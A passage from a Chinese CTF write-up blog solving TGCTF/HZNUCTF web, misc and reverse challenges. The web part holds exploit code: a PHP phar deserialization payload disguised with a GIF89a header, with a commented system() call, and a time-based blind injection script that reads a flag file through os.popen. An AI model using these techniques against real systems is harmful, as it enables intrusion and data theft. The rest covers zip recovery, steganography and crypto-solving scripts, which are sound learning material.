class="variable">$useful13</span>;<span class="keyword">public</span> <span class="variable">$useful14</span>;<span class="keyword">public</span> <span class="variable">$useful15</span>;<span class="keyword">public</span> <span class="variable">$useful16</span>;<span class="keyword">public</span> <span class="variable">$useful17</span>;<span class="keyword">public</span> <span class="variable">$useful18</span>;<span class="keyword">public</span> <span class="variable">$useful19</span>;<span class="keyword">public</span> <span class="variable">$useful20</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// public function __set($arg1, $arg2) &#123;</span></span><br><span class="line">        <span class="comment">//     if ($this-&gt;out-&gt;useful7) &#123;</span></span><br><span class="line">        <span class="comment">//         echo &quot;Seven is my lucky number&lt;br&gt;&quot;;</span></span><br><span class="line">        <span class="comment">//         system(&#x27;whoami&#x27;);</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is your future.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">// system($_POST[&quot;wow&quot;]);</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;win&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// public function __destruct()&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;no = &quot;no&quot;;</span></span><br><span class="line">        <span class="comment">//     return $this-&gt;no;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if (file_exists($_GET[&#x27;filename&#x27;]))&#123;</span></span><br><span class="line">    <span class="comment">//     echo &quot;Focus on the previous step!&lt;br&gt;&quot;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// else&#123;</span></span><br><span class="line">    <span class="comment">//     $data=substr($_GET[&#x27;filename&#x27;],0,-4);</span></span><br><span class="line">    <span class="comment">//     unserialize(best64_decode(str: $data));</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title function_ invoke__">yesterday</span>();</span><br><span class="line"><span class="variable">$payload</span>-&gt;study = <span class="keyword">new</span> <span class="title function_ invoke__">today</span>();</span><br><span class="line"><span class="variable">$payload</span>-&gt;study-&gt;doing = <span class="keyword">new</span> <span class="title function_ invoke__">future</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo urlencode(serialize($payload));</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;123.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/3fa7784f-a2fa-4e8a-81b6-44d63a630604.png"
                        alt=""
                 ></p>
<h3 id="熟悉的配方，熟悉的味道"><strong>熟悉的配方，熟悉的味道</strong></h3>
<p>盲注即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import <span class="keyword">string</span></span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://node1.tgctf.woooo.tech:31931/&quot;</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> strr in <span class="keyword">string</span>.printable:</span><br><span class="line">        shell = f<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">import time</span></span><br><span class="line"><span class="string">a = os.popen(&#x27;cat /fl*&#x27;).read()</span></span><br><span class="line"><span class="string">if len(a) &gt; &#123;i&#125; and a[&#123;i&#125;] == &#x27;&#123;strr&#125;&#x27;:</span></span><br><span class="line"><span class="string">    time.sleep(2)</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        start = time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">       </span><br><span class="line">        requests.<span class="title function_ invoke__">post</span>(url, data=&#123;<span class="string">&#x27;expr&#x27;</span>: shell&#125;)</span><br><span class="line">        </span><br><span class="line">        end = time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">2</span>:</span><br><span class="line">            ans += strr</span><br><span class="line">            <span class="keyword">print</span>(ans)</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/311cf1ea-6def-4849-8873-9f7093667445.png"
                        alt=""
                 ></p>
<h3 id="直面天命（复仇）"><strong>直面天命（复仇）</strong></h3>
<p>一把梭即可 <img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/d419f3ad-f018-41de-9b87-f899f38411aa.png"
                        alt=""
                 ></p>
<h3 id="AAA偷渡阴平（复仇）"><strong>AAA偷渡阴平（复仇）</strong></h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/fbc10e99-2f95-4721-87e5-e9badfcae3b2.png"
                        alt=""
                 ></p>
<h3 id="什么文件上传？（复仇）"><strong>什么文件上传？（复仇）</strong></h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/867c757a-3c0a-40d4-9f83-c3e038bf9619.png"
                        alt=""
                 ></p>
<h2 id="Misc：">Misc：</h2>
<h3 id="简单签到，关注：”杭师大网安“谢谢喵🐱">简单签到，关注：”杭师大网安“谢谢喵🐱</h3>
<p>关注公众号得flag。</p>
<h3 id="ez-zip">ez_zip</h3>
<p>爆破得到密码是20250412，解压后得到一个压缩包和一个sh512.txt，把txt中的那句话sha512一下，deflate明文攻击。 <img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/987ea59f-599d-4926-924a-a29bc18b7015.png"
                        alt=""
                 >根据数据存储区修复了一下压缩包</p>
<p>用Bandizip无密码快速压缩一个例子，然后对照着把压缩包修复一下就行</p>
<p>dirEntry的flag.txt应该是少东西了，需要我们手动补上</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/5045fc70-5cdf-4ff4-9aca-2b71aac86caf.png"
                        alt="5045fc70-5cdf-4ff4-9aca-2b71aac86caf"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/c298ce10-0d45-451a-ab91-a4f412cd7f24.png"
                        alt="c298ce10-0d45-451a-ab91-a4f412cd7f24"
                 ></p>
<p>修复完成后打开即可得到flag：TGCTF{Warrior_You_have_defeated_the_giant_dragon!}</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/18fe7e85-2673-43d9-8f03-d7ec5b2c6e25.png"
                        alt="18fe7e85-2673-43d9-8f03-d7ec5b2c6e25"
                 ></p>
<h3 id="TeamGipsy-ctfer"><strong>TeamGipsy&amp;ctfer</strong></h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/1ac79dc0-4137-458a-b1e4-f9c287333d41.png"
                        alt=""
                 >桌面上有个mimi.txt，发现出题人用Docker起了一个MySQL，直接去/var/lib/docker目录下翻</p>
<p>发现在/var/lib/docker/overlay2/6ac971c2de3baa602bb4335d6899bbf1963140364ce248decc9557b2f49139f9/diff/root/.mysql_history中就有flag：HZNUCTF{0H!_YOu_are_really_the_TeamGipsy_ctfer}</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/4e32d7ce-031a-4e80-90a6-5d2b10178ba7.png"
                        alt=""
                 ></p>
<h3 id="你能发现图中的秘密吗？"><strong>你能发现图中的秘密吗？</strong></h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/6e51df8a-8635-41d0-8c92-1c1e0171107e.png"
                        alt="" title=" =1531x125"
                 ></p>
<p>解压得到两张新的图片，第一张的左上角有第二部分的flag：</p>
<p>flag2=_attentive_and_conscientious}</p>
<p>用010打开final_challenge2.png，发现有一块IDAT块不太正常</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/6d5cd91f-edde-4018-9169-05b284a1d7f0.png"
                        alt="6d5cd91f-edde-4018-9169-05b284a1d7f0"
                 ></p>
<p>提取出来，补上PNG文件头尾，然后爆破宽高即可得到另一段flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/256ea54c-f030-4f11-8014-7c32fd29e67c.png"
                        alt="256ea54c-f030-4f11-8014-7c32fd29e67c"
                 ></p>
<p>Tips：这里要注意把IDAT的前四个字节也一起复制过来，并且保持不变</p>
<p>因为四字节代表的是数据长度，这里如果出错，图片的数据长度就错了，因此再爆破宽高也没用了</p>
<p>两段flag合起来就是最后的flag：flag{you_are_so_attentive_and_conscientious}</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/948d611c-6920-4fb4-8b49-17f806516925.png"
                        alt=""
                 ></p>
<h3 id="next-is-the-end"><strong>next is the end</strong></h3>
<p>直接脚本就行</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#!<span class="regexp">/usr/</span>bin/env python3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">def <span class="title function_">traverse</span>(path):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    递归遍历目录：</span></span><br><span class="line"><span class="string">      1. 如果当前目录中存在名为 &#x27;next_or_end&#x27; 的子目录，则进入该目录；</span></span><br><span class="line"><span class="string">      2. 否则：</span></span><br><span class="line"><span class="string">         - 如果目录中只有一个项目且该项目为文件，则返回该文件路径；</span></span><br><span class="line"><span class="string">         - 如果只有一个项目但是目录，则继续进入；</span></span><br><span class="line"><span class="string">         - 如果目录中有多个项目，则报错无法确定正确路径。</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="title class_">True</span>:</span><br><span class="line">        # 若当前路径不是目录，则到达最终目标（通常是文件）</span><br><span class="line">        <span class="keyword">if</span> not os.<span class="property">path</span>.<span class="title function_">isdir</span>(path):</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line">        items = os.<span class="title function_">listdir</span>(path)</span><br><span class="line">        # 如果当前目录中有 <span class="string">&#x27;next_or_end&#x27;</span> 文件夹，则进入该目录</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;next_or_end&quot;</span> <span class="keyword">in</span> <span class="attr">items</span>:</span><br><span class="line">            path = os.<span class="property">path</span>.<span class="title function_">join</span>(path, <span class="string">&quot;next_or_end&quot;</span>)</span><br><span class="line">        <span class="attr">else</span>:</span><br><span class="line">            # 当前目录没有 <span class="string">&#x27;next_or_end&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="title function_">len</span>(items) == <span class="number">1</span>:</span><br><span class="line">                next_path = os.<span class="property">path</span>.<span class="title function_">join</span>(path, items[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">if</span> os.<span class="property">path</span>.<span class="title function_">isdir</span>(next_path):</span><br><span class="line">                    # 如果唯一的项目还是目录，则继续进入</span><br><span class="line">                    path = next_path</span><br><span class="line">                elif os.<span class="property">path</span>.<span class="title function_">isfile</span>(next_path):</span><br><span class="line">                    # 如果唯一的项目是文件，则返回</span><br><span class="line">                    <span class="keyword">return</span> next_path</span><br><span class="line">                <span class="attr">else</span>:</span><br><span class="line">                    <span class="title function_">print</span>(f<span class="string">&quot;遇到未知类型：&#123;next_path&#125;&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="title class_">None</span></span><br><span class="line">            <span class="attr">else</span>:</span><br><span class="line">                <span class="title function_">print</span>(f<span class="string">&quot;无法确定路径：目录 &#x27;&#123;path&#125;&#x27; 中存在多个项目：&#123;items&#125;&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="title class_">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    # 从命令行获取起始目录，若未传参数则默认为当前目录</span><br><span class="line">    start_path = sys.<span class="property">argv</span>[<span class="number">1</span>] <span class="keyword">if</span> <span class="title function_">len</span>(sys.<span class="property">argv</span>) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&quot;.&quot;</span></span><br><span class="line">    result = <span class="title function_">traverse</span>(start_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="attr">result</span>:</span><br><span class="line">        <span class="title function_">print</span>(f<span class="string">&quot;最终目标路径：&#123;result&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.<span class="property">path</span>.<span class="title function_">isfile</span>(result):</span><br><span class="line">            # 如果目标为文件，读取并打印文件内容</span><br><span class="line">            <span class="attr">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="title function_">open</span>(result, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> <span class="attr">f</span>:</span><br><span class="line">                    content = f.<span class="title function_">read</span>()</span><br><span class="line">                <span class="title function_">print</span>(<span class="string">&quot;文件内容如下：&quot;</span>)</span><br><span class="line">                <span class="title function_">print</span>(content)</span><br><span class="line">            except <span class="title class_">Exception</span> <span class="keyword">as</span> <span class="attr">e</span>:</span><br><span class="line">                <span class="title function_">print</span>(f<span class="string">&quot;读取文件时出错：&#123;e&#125;&quot;</span>)</span><br><span class="line">        <span class="attr">else</span>:</span><br><span class="line">            <span class="title function_">print</span>(<span class="string">&quot;最终目标不是一个普通文件。&quot;</span>)</span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        <span class="title function_">print</span>(<span class="string">&quot;未能找到最终目标。&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>看到flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/a0c5ea4e-7705-4e4a-8d64-5351c9c7ef5e.png"
                        alt="" title=" =1697x701"
                 ></p>
<h3 id="where-it-is-osint">where it is(osint)</h3>
<p>谷歌识图</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/b7821666-222f-4a79-b959-dc9bd48ce7a0.png"
                        alt="" title=" =1780x1183"
                 ></p>
<p>点进去发现</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/d05fc578-659e-44f4-8a8e-b6cd840a6508.png"
                        alt="" title=" =1693x1019"
                 ></p>
<p>站点就是这个：港墘站</p>
<h3 id="你的运气是好是坏？"><strong>你的运气是好是坏？</strong></h3>
<p>笑死我了flag直接一试就试出来了：114514</p>
<h3 id="这是啥o-o"><strong>这是啥o_o</strong></h3>
<p>下载得到一个无后缀的文件，文件头发现是gif，改成gif后拖进ps里看，发现最后几帧有散开的汉信码碎片。修复如下：</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/39f90506-aef0-4283-a135-6317525f3e77.png"
                        alt="" title=" =749x713"
                 ></p>
<p>扫码得到：time is your fortune ,efficiency is your life</p>
<p>猜测是帧间隔隐写，用puzzlesolver提出帧间隔放入python转ASCII码，得到flag</p>
<blockquote>
<p>a= [‘840’, ‘710’, ‘670’, ‘840’, ‘700’, ‘1230’, ‘890’, ‘1110’, ‘1170’, ‘950’, ‘990’, ‘970’, ‘1170’, ‘1030’, ‘1040’, ‘1160’, ‘950’, ‘1170’, ‘1120’, ‘950’, ‘1190’, ‘1050’, ‘1160’, ‘1040’, ‘950’, ‘1160’, ‘1050’, ‘1090’, ‘1010’, ‘330’, ‘1250’]</p>
<p>s = ‘’</p>
<p>for i in a:</p>
<p>s+=chr(int(i)//10)</p>
<p>print(s)</p>
</blockquote>
<p>TGCTF{You_caught_up_with_time!}</p>
<h2 id="Reverse：">Reverse：</h2>
<h3 id="XTEA">XTEA</h3>
<p>大端序密文输入。</p>
<p>delta没给，直接爆破0—&gt;0xffffffff</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">void encipher(unsigned <span class="built_in">int</span> num_rounds, uint32_t v[<span class="number">2</span>], uint32_t const key[<span class="number">4</span>],uint32_t delta) &#123;</span><br><span class="line">	unsigned <span class="built_in">int</span> i;</span><br><span class="line">	uint32_t v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], <span class="built_in">sum</span> = <span class="number">0</span>,a,b,c	;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">	/*	printf(<span class="string">&quot;%x,%x,%x\n&quot;</span>, v0, v1,<span class="built_in">sum</span>);*/</span><br><span class="line">		a = (v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>);</span><br><span class="line">		//printf(<span class="string">&quot;%x\n&quot;</span>, a);</span><br><span class="line">		b = a+v1;</span><br><span class="line">		c = <span class="built_in">sum</span> + key[<span class="built_in">sum</span> &amp; <span class="number">3</span>];</span><br><span class="line">		v0 += ( b^ c);</span><br><span class="line">		<span class="built_in">sum</span> -= delta;</span><br><span class="line">		v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (<span class="built_in">sum</span> + key[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void decipher(unsigned <span class="built_in">int</span> num_rounds, uint32_t v[<span class="number">2</span>], uint32_t const key[<span class="number">4</span>],uint32_t delta) &#123;</span><br><span class="line">	unsigned <span class="built_in">int</span> i;</span><br><span class="line">	uint32_t v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], <span class="built_in">sum</span> = delta * num_rounds ;</span><br><span class="line">	<span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++) <span class="built_in">sum</span> -= delta;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line"></span><br><span class="line">		v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (<span class="built_in">sum</span> + key[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">		<span class="built_in">sum</span> += delta;</span><br><span class="line">		v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (<span class="built_in">sum</span> + key[<span class="built_in">sum</span> &amp; <span class="number">3</span>]);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">	uint32_t v[<span class="number">8</span>] = &#123; <span class="number">0x8CCB2324</span>, <span class="number">0x09A7741A</span>, <span class="number">0xFB3C678D</span>, <span class="number">0xF6083A79</span>, <span class="number">0xF1CC241B</span>, <span class="number">0x39FA59F2</span>, <span class="number">0xF2ABE1CC</span>, <span class="number">0x17189F72</span> &#125;;</span><br><span class="line">	uint32_t k[<span class="number">4</span>] = &#123; <span class="number">0x000019F8</span>, <span class="number">0x000011BE</span>, <span class="number">0x00000991</span>, <span class="number">0x00003418</span> &#125;;</span><br><span class="line">	srand(<span class="number">2024</span>);</span><br><span class="line">	uint32_t v2[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	char flag[] = <span class="string">&quot;HZNUCTF&#123;&quot;</span>;</span><br><span class="line">	//<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">	//	k[i] = rand();</span><br><span class="line">	//&#125;</span><br><span class="line"></span><br><span class="line">	uint32_t delta = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (uint32_t j = <span class="number">0</span>; j &lt; <span class="number">0xffffffff</span>; j++) &#123;</span><br><span class="line">		v2[<span class="number">0</span>] = <span class="number">0x485a4e55</span>;</span><br><span class="line">		v2[<span class="number">1</span>] = <span class="number">0x4354467b</span>;</span><br><span class="line">		encipher(<span class="number">32</span>, v2, k,j);</span><br><span class="line">		<span class="keyword">if</span> (v2[<span class="number">0</span>] == v[<span class="number">0</span>]) &#123;</span><br><span class="line">			delta = j;</span><br><span class="line">			printf(<span class="string">&quot;%d\n&quot;</span>, j);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	printf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	unsigned <span class="built_in">int</span> r = <span class="number">32</span>;			</span><br><span class="line">	<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">6</span>; i &gt;=<span class="number">0</span>; i--) &#123;</span><br><span class="line">		decipher(r, &amp;v[i], k, delta);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">		printf(<span class="string">&quot;%c&quot;</span>, *((char*)v + i));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后手动把四字节反转一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">HZNUCTF&#123;ae6-9f57-4b74-b423-98eb&#125;</span><br></pre></td></tr></table></figure>
<h3 id="conforand">conforand</h3>
<p>混淆成一坨了，把seed改为1后动调+盯帧查看数据变化和加密逻辑。</p>
<p>魔改rc4，魔改了下面的部分。</p>
<p>时间戳作为种子生成随机数（delta）对密钥进行了异或加密。</p>
<p>加密时盒交换就交换了一次，详情看下面的脚本。</p>
<p>解密时对随机数进行爆破再异或密钥解密魔改rc4就行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//s 表的长度取 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> size 257</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox[<span class="number">257</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化 s 表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_sbox</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* key,<span class="type">unsigned</span> <span class="type">int</span> delta)</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> i, j, k;</span><br><span class="line">	<span class="type">int</span> tmp;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> keyt[<span class="number">257</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">//int delta = 0x6B8B4567;</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">		sbox[i] = i;</span><br><span class="line">		keyt[i] = (key[i % <span class="number">9</span>] ^ delta) % <span class="number">256</span>; </span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	j =k = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">		tmp = sbox[i];</span><br><span class="line">		j = (j + tmp + keyt[i]) % <span class="number">257</span>;  </span><br><span class="line">		<span class="comment">//printf(&quot;%x,&quot;, j);</span></span><br><span class="line">		sbox[i] = sbox[j];</span><br><span class="line">		sbox[j] = tmp;</span><br><span class="line">		<span class="comment">/*if (++k &gt;= 12)</span></span><br><span class="line"><span class="comment">			k = 0;*/</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//printf(&quot;\n&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加解密函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">enc_dec</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">unsigned</span> <span class="type">char</span>* data,<span class="type">unsigned</span> <span class="type">int</span> delta)</span> &#123;</span><br><span class="line">	<span class="type">int</span> i, j, k, R, tmp;</span><br><span class="line"></span><br><span class="line">	init_sbox(key,delta);</span><br><span class="line">	<span class="comment">//printf(&quot;R:\n&quot;);</span></span><br><span class="line">	j = k = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="type">char</span>*)data); i++) &#123;</span><br><span class="line">		j = (j + <span class="number">1</span>) % size;</span><br><span class="line">		k = (k + sbox[j]) % size;</span><br><span class="line"></span><br><span class="line">		tmp = sbox[j];</span><br><span class="line">		sbox[j] = sbox[k];</span><br><span class="line">		<span class="comment">//sbox[k] = tmp;</span></span><br><span class="line">		<span class="type">int</span> a, b, c;</span><br><span class="line">		a = (sbox[j]);</span><br><span class="line">		b = sbox[k];</span><br><span class="line">		c = a + b;</span><br><span class="line">		<span class="comment">/*for (int i = 0; i &lt; 256; i++) &#123;</span></span><br><span class="line"><span class="comment">			printf(&quot;0x%x,&quot;, sbox[i]);</span></span><br><span class="line"><span class="comment">		&#125;*/</span></span><br><span class="line">		R = sbox[c % size];</span><br><span class="line">		<span class="comment">//printf(&quot;%x,&quot;, R);</span></span><br><span class="line">		data[i] ^= R;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">100</span>] =<span class="string">&quot;JustDoIt!&quot;</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">100</span>] = <span class="string">&quot;000000000000000000000000000000000000000000&quot;</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> mm[<span class="number">100</span>] = &#123; <span class="number">0x83</span>,<span class="number">0x1e</span>,<span class="number">0x9c</span>,<span class="number">0x48</span>,<span class="number">0x7a</span>,<span class="number">0xfa</span>,<span class="number">0xe8</span>,<span class="number">0x88</span>,<span class="number">0x36</span>,<span class="number">0xd5</span>,<span class="number">0x0a</span>,<span class="number">0x08</span>,<span class="number">0xf6</span>,<span class="number">0xa7</span>,<span class="number">0x70</span>,<span class="number">0x0f</span>,<span class="number">0xfd</span>,<span class="number">0x67</span>,<span class="number">0xdd</span>,<span class="number">0xd4</span>,<span class="number">0x3c</span>,<span class="number">0xa7</span>,<span class="number">0xed</span>,<span class="number">0x8d</span>,<span class="number">0x51</span>,<span class="number">0x10</span>,<span class="number">0xce</span>,<span class="number">0x6a</span>,<span class="number">0x9e</span>,<span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x83</span>,<span class="number">0x56</span>,<span class="number">0xe7</span>,<span 